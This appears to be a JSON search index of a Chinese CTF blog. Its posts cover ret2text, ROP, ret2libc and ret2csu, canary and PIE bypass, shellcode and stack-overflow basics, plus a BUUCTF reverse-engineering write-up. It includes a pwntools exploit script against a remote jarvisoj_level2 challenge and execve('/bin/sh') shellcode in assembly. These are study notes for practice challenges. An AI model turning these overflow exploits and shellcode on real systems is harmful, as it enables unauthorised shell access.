[{"id":"e75c21f70c678b134f6a0bde8c339180","title":"ret2xx","content":"\n\nret2xx什么是ret2xx泛指ret2text，ret2shellcode，ret2syscall，ret2libc，ret2csu，其中ret2是return to的谐音，可以使用利用eip指针的方法来获取权限\nROPReturn Oriented Programming\nROP指通过修改Gadgets的ret结尾的指令顺序来实施攻击，需要如下条件：\n1.程序存在栈溢出，能控制返回地址\n2.可以找到满足条件的gadgets，而且知道gadgets的地址\nret2text对.text节的利用，会使用程序中已有的代码来进行攻击\n\n\n\n\n\n\n\n\n\n进程存在危险函数如system(“/bin”)或execv(“/bin/sh”,0,0)的片段，可以直接劫持返回地址到目标函数地址上。从而getshell。\n例题jarvisoj_level2首先找system函数的地址和/bin/sh字符串的地址\n\n\n构造思路如下，先用0x88把缓冲区沾满，然后用0x4把ebp占满，然后修改返回地址为system(“/bin/sh”)即system的函数地址加上/bin/sh的地址，脚本编写时可以用pwntools的ELF模块\nfrom pwn import *\nelf = ELF(\"level2\")\np = remote(\"node4.buuoj.cn\", 28053)\n\np.recvuntil(\"Input:\\n\")\n\npayload = b'a' * 0x88 + b'b' * 0x4 + p32(0x08048320) + p32(0x0) + p32(0x804A024)\n# payload分为五部分\n# 第一块0x88个a填充栈到溢出\n# 第二块0x4个b填充ebp\n# 第三块为system函数地址\n# 第四块为system的返回地址(随便填任意值就行，不然会EOF)\n# 第五块为/bin/sh的地址指针\np.send(payload)\n\np.interactive()\n\n例题jarvisoj_level2_x64成因和32位的一样，区别在于64位函数在调用传参时先试用寄存器(依次为rdi,rsi,rdx,rcx,r8,r9)，那么我们将rdi指向/bin/sh即可\n设置rdi的方法是使用pop rdi; ret代码片段，用ropgagdet可以找\nret2shellcode控制程序来执行shellcode代码，一般而言shellcode需要我们自己填充\n例题jarvisoj_level1ret2syscall控制程序执行系统调用获取shell\n前提是系统存在0x80等中断类似触发系统调用的情况\n\n\n\n\n\n\n\n\n\n用户进程在执行系统调用前，先把系统调用名（实际上是系统调用号）、输入参数等放到寄存器上(EBX,ECX等寄存器)然后发出int 0x80指令，即触发xxx号中断系统暂停用户进程，根据xxx号中断找到中断服务程序，这个程序名就叫system_call()system_call()接着执行。它会从寄存器中找到系统调用名、输入参数等，并根据系统调用上下文中找到引发系统调用的进程；执行完毕后它又会把输出结果放到寄存器中。系统恢复用户进程，进程从寄存器中取到自己想要的东西，然后继续执行。\n例题inndy_ropret2libc控制函数执行libc中的函数，通常是返回某个函数的plt或者函数的具体位置，一般情况下，我们会选择执行system(“/bin/sh”)，故而此时我们需要知道system函数的地址\n\n\n\n\n\n\n\n\n\n补一下plt的概念：GOT和PLT都是一种重定向方式，比如printf函数位于glibc动态库内，所以在编译和链接阶段，链接器无法知知道进程运行起来之后printf函数的加载地址。只有进程运运行后，printf函数的地址才能确定。\n\n\n\n\n\n\n\n\n\nlibc是Linux下的ANSI C的函数库。ANSI C是基本的C语言函数库，包含了C语言最基本的库函数。这个库可以根据 头文件划分为 15  个部分，其中包括：字符类型 ()、错误码()、 浮点常数 ()、数学常数 ()、标准定义 ()、 标准 I/O ()、工具函数 ()、字符串操作 ()、 时间和日期 ()、可变参数表 ()、信号 ()、 非局部跳转 ()、本地信息 ()、程序断言 ()\n因此libc存放的都是使用过的函数或者字符串，查询libc可以使用ldd[文件名查询libc文件]\n例题jarvisoj_level1ret2csu\n\n\n\n\n\n\n\n\n在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候我们很难找到每一个寄存器对应的gadgets，这时候，我们可以利用x64下的 __libc_csu_init 中的 gadgets，这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在\n也就是说，其实 ret2csu和利用libc的思路一样，都是包含的指令来达到目标\n例题level5推荐阅读https://zhuanlan.zhihu.com/p/362737337\n","slug":"CTF/pwn/ret2xx","date":"2022-01-18T11:55:26.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"5cbed18fc0178c7e2f7d933895162e2e","title":"canary_pie绕过","content":"\n\nCanary_pie绕过Canary机制介绍canary是一种用来防护栈溢出的保护机制，原理是先在函数的入口处，从fs/gs寄存器中取出一个4字节或者8字节的值存到栈上，当程序结束后再检查这个值是否和存进去的值一致\nCanary bypass只要保持canary值不变，依旧可以修改eip的值\n格式化字符串绕过canary通过格式化字符串读取canary的值\n格式化字符串C语言的printf函数一般是这么用printf(“%s”, str);这时str的内容就会被打印出来，%s就是所说的格式化字符串，将变量中的内容按照格式化字符串的规定打印出来，由于%s判断字符串结束的依据是结尾的\\x00，因此可以把输入和canary连接在一起，将canary一起打印出来。需要注意的是canary的最后一位一定时\\x00，用于防止连带输出，所以我们改的时候要把canary的最后一位也改了\n例题canary bypass\ncanary爆破程序中必须有fork函数，不断自我复制，我们可以逐位爆破，若报错则说明这一位不对，若可以接着跑下一位就能一直跑最后得出正确的canary\nStack smashing故意触发canary_ssp leak\n劫持__stack_chk_fail通过程序中的其他函数，修改got表中的__stack_chk_fail函数地址，在栈溢出后执行该函数，然后就会跳到我们想要执行的函数\nPIE机制介绍PIE是一个针对代码段(.text)，数据段(.data)，未初始化全局变量段(.bss)等固定地址的一个防护技术，如果程序开启了PIE保护，那么每次程序加载的时候都会变换加载地址，从而不能通过ROPgadget等工具解题\nPIE bypass对于开启了PIE保护的程序，所有代码段的地址都只有最后三个数是已知的，而程序加载地址一般都是以内存页为单位的，所以程序的基地址最后三个数字一定是0，也就是那些地址已知的最后三个数就是实际地址的最后三个数。根据此，虽然我们没有完整地址，但是只要我们指导最后三个数，就可以利用栈上已有的地址，只修改最后两个字节，即可绕过。\n对于绕过PIE保护的核心思想就是partial writing\n例题","slug":"CTF/pwn/canary_pie绕过","date":"2022-01-18T11:53:50.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"ce6a61e69eea25b26a44cdf9f84d23a7","title":"RE-BUU","content":"\n\nBUUCTF-Reverse刷题记录新年快乐一个upx壳，怎么看出来的还不知道，等回头学会了再补\n直接upx -d去壳，扔进idaF5看代码就是比较输入字符串和”HappyNewYear!”，因此这个字符串就是flag\nxor主函数是逻辑如下，遍历输入字符串，将当前位与前一位异或，最终得到新字符串，将新字符串与global字符串比较，因此global就是异或后的结果，将其倒过来重新异或一遍即可。\n在IDA里双击global找到结果字符串（直接看长度不太对，再点进去一次），就能找到global的值，exp如下，注意去掉最后的f（懒得写进去了）\ns = ['f', 0xa, 'k', 0xc, 'w', '&amp;', 'O', '.', '@', 0x11, 'x', 0xd, 'Z', ';', 'U', 0x11, 'p', 0x19, 'F', 0x1F, 'v', '\"', 'M', '#', 'D', 0xe, 'g', 6, 'h', 0xf, 'G', '2', 'O']\nprint(len(s))\nflag = 'f'\nfor i in range(33):\n\tif isinstance(s[i], int):\n\t\ts[i] = chr(s[i])\n\nfor i in range(32, 0, -1):\n\tflag += chr(ord(s[i - 1]) ^ ord(s[i]))\nprint(flag[0] + flag[::-1])\n\nhelloworld直接APKIDE打开找到MainActivity.smali翻到flag\n","slug":"CTF/reverse/RE-BUU","date":"2022-01-18T07:17:52.000Z","categories_index":"CTF/REVERSE","tags_index":"CTF REVERSE","author_index":"S1eepy"},{"id":"33178a053863ba406bb965eb7a776aab","title":"shellcode","content":"\n\nshellcode什么是shellcode软件漏洞利用过程中使用一小段机器代码\n启动shell进行交互\n可能存在的问题shellcode只允许输入十几个字节\n无法调用系统函数(不知道system的地址)\n解决触发中断（0x80或者syscall）\n如何编写shellcode32位;;nasm -f elf32 i386.asm\n;;ld -m elf_i386 -o i386 i386.o\n;;objdump -d i386\nglobal _start\n_start:\n\tpush &quot;&#x2F;sh&quot;\n\tpush &quot;&#x2F;bin&quot;\n\tmov ebx, esp;;ebx&#x3D;&#39;&#x2F;bin&#x2F;sh&#39;\n\txor edx, edx;;edx&#x3D;0\n\txor ecx, ecx;;ecx&#x3D;0\n\tmov al, 0xb;;设置al&#x3D;0xb\n\tint 0x80\n\n64位;;name -f elf64 x64.asm\n;;ld -m elf_x86 -o x64 x64.o\n;;objdump -d x64\nglobal _start\n_start:\n\tmov rbx, &#39;&#x2F;bin&#x2F;sh&#39;\n\tpush rbx\n\tpush rsp\n\tpop rdi\n\txor esi, esi\n\txor edx, edx\n\tpush 0x3b\n\tpop rax\n\tsyscall\n\npwntools快速生成shellcodefrom pwn import *\ncontext(log_level='debug',arch='i386',os='linux')\nshellcode=asm(shellcraft.sh())\n\n例题mrctf2020_shellcodeciscn_2019_s_9pwnable_orwshellcode的变形mrctf_shellcode_revengealpha3编码github.com/TaQini/alpha3.git\n","slug":"CTF/pwn/shellcode","date":"2022-01-18T04:55:28.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"b0e5183f9443ee80e444d03488f07c6f","title":"栈溢出基础","content":"\n\n栈溢出基础C语言函数调用栈栈是程序运行时一块连续的内存区域，用来保存函数运行时的状态信息，包括函数的局部变量等\n当发生函数调用时，调用函数(caller)的状态被保存在栈内，被调用函数(callee)的状态被压入调用栈的栈顶\n函数调用结束时栈顶的函数(callee)状态被弹出，栈顶恢复到调用函数(caller)的状态\n函数调用栈的内存中从高地址到低地址生长，所以栈顶内存地址在压栈时变小，退栈时变大\n寄存器\neip寄存器：下一条要被执行的指令，它所指向的指令\nesp寄存器：保存调用栈的栈顶地址\nebp寄存器：保存当前函数状态基地址\n\n函数调用过程先把参数压入栈\n然后将调用函数(caller)的下一条指令的地址作为被调用函数(callee)的返回地址压入栈中\n再将ebp的值压入栈，并将ebp寄存器的值更新为当前栈顶的地址，这样caller的ebp信息得以保存，同时ebp被更新为callee的基地址\n最后是将callee的局部变量等数据压入栈（栈溢出最经常出现的位置）\n\n函数调用结束恢复过程变化的核心任务是丢弃callee的状态，将栈顶恢复到caller的过程\n首先将局部变量从栈顶弹出，栈顶会恢复到callee的基地址\n然后caller的基地址从栈顶弹出，存到ebp内，这样caller的ebp信息得以恢复，此时栈顶指向返回地址\n再将返回地址从栈内弹出，存到eip寄存器内，这样caller的eip信息得以恢复\n栈溢出原理从上面可以看出，caller的eip完全是由返回地址控制的，只要想办法在写入局部变量时控制长度，写入到返回地址处，就能够让caller的eip调到其他地方，从而getshell\n\n\n\n\n\n\n\n\n\n缓冲区溢出：本质是向定长的缓冲区写入了超长的数据，从而导致数据覆盖了合法内存，包括栈溢出，堆溢出，data段溢出等\n栈溢出基本利用","slug":"CTF/pwn/栈溢出基础","date":"2022-01-18T04:54:11.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"a100591a1cf0e28185d19ee6ce40ac1f","title":"Learn_RE","content":"\n\nRE学习笔记记录一下寒假期间学习RE的知识\n","slug":"CTF/reverse/Learn_RE","date":"2022-01-18T04:52:25.000Z","categories_index":"CTF/REVERSE","tags_index":"CTF REVERSE","author_index":"S1eepy"},{"id":"0c0a9c1a2db47172b0f7b7bd30e860a1","title":"Learn_PWN","content":"PWN学习笔记记录一下放大三寒假期间学习PWN的知识\n","slug":"CTF/pwn/Learn_PWN","date":"2022-01-18T04:51:06.000Z","categories_index":"CTF/PWN","tags_index":"CTF PWN","author_index":"S1eepy"},{"id":"298a963bd623954dbff89574513140ea","title":"Learn_WEB","content":"\n\nWEB学习笔记由于之前的web笔记被火绒当病毒杀了，当时没救回来，于是乎就懒得再写一遍了，之后跟着更新就行应该\n","slug":"CTF/web/Learn_WEB","date":"2022-01-18T03:20:26.000Z","categories_index":"CTF/WEB","tags_index":"CTF WEB","author_index":"S1eepy"},{"id":"b9663f58f18133b35bfe243f3e916a80","title":"Hello World","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new \"My New Post\"\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n","slug":"hello-world","date":"2022-01-18T01:13:55.638Z","categories_index":"","tags_index":"","author_index":"S1eepy"}]